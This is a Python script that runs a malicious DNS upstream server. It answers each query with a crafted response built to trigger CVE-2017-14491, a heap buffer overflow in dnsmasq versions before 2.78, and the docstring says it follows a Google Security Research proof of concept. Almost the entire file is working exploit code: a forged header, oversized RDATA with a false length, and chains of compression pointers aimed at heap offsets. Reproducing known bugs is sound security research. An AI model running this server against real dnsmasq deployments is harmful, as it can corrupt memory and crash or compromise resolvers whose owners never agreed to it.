#!/usr/bin/env python3
"""
Malicious DNS upstream server for triggering CVE-2017-14491 in dnsmasq.
Based on Google Security Research PoC structure.
https://github.com/google/security-research-pocs/blob/master/vulnerabilities/dnsmasq/CVE-2017-14491.py
"""

import socket
import struct

PORT = 5399


def dw(x):
    """Pack 16-bit value big-endian."""
    return struct.pack(">H", x)


def dd(x):
    """Pack 32-bit value big-endian."""
    return struct.pack(">I", x)


def make_malicious_response(query):
    """
    CVE-2017-14491: Heap buffer overflow in dnsmasq < 2.78.

    Based on Google Security Research PoC. Uses fixed question structure
    to ensure compression pointer offsets are correct.
    """
    txid = query[:2]

    # DNS Header
    data = txid
    data += dw(0x85A0)  # Flags: QR=1, AA=1, RD=1, RA=1
    data += dw(1)  # 1 question
    data += dw(0x52)  # 82 answers
    data += dw(0)  # 0 authority
    data += dw(0)  # 0 additional

    # Fixed question section (matches what client would send for PTR query)
    # Using reverse DNS format: 125.8.8.8.in-addr.arpa
    data += b"\x03125\x018\x018\x018\x07in-addr\x04arpa\x00"
    data += b"\x00\x0c"  # Type PTR
    data += b"\x00\x01"  # Class IN

    # Answer 1: First PTR record with oversized RDATA claim
    # Offset at this point: ~40 bytes
    data += b"\xc0\x0c"  # Pointer to question name
    data += b"\x00\x0c\x00\x01"  # Type PTR, Class IN
    data += dd(61)  # TTL
    data += dw(0x0400)  # RDLENGTH = 1024 (lie about size)

    # Actual RDATA: 16 x (length 62 + 62 Z's) + (length 14 + 14 Z's) + null
    for _ in range(16):
        data += b"\x3e" + b"Z" * 62
    data += b"\x0e" + b"Z" * 14 + b"\x00"

    # Answer 2: PTR with full domain name (RDLENGTH=0x26=38)
    data += b"\xc0\x0c\x00\x0c\x00\x01\x00\x00\x00\x3d\x00\x26"
    data += b"\x08DCBBEEEE\x04DDDD\x08CCCCCCCC\x04AAAA\x04BBBB\x03com\x00"

    # Answers 3-81: compression pointers to offset 0x440
    for _ in range(79):
        data += b"\xc0\x0c\x00\x0c\x00\x01\x00\x00\x00\x3d\x00\x02\xc4\x40"

    # Answer 82: name with compression pointer to offset 0x449
    data += b"\xc0\x0c\x00\x0c\x00\x01\x00\x00\x00\x3d\x00\x11"
    data += b"\x04EEEE\x09DAABBEEEE\xc4\x49"

    return data


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", PORT))

    print(f"[*] Malicious DNS server on port {PORT}")
    print("[*] Waiting for queries from dnsmasq...")

    while True:
        data, addr = sock.recvfrom(512)
        print(f"[*] Query from {addr}")

        response = make_malicious_response(data)
        print(f"[*] Sending malicious response ({len(response)} bytes)")
        sock.sendto(response, addr)


if __name__ == "__main__":
    main()
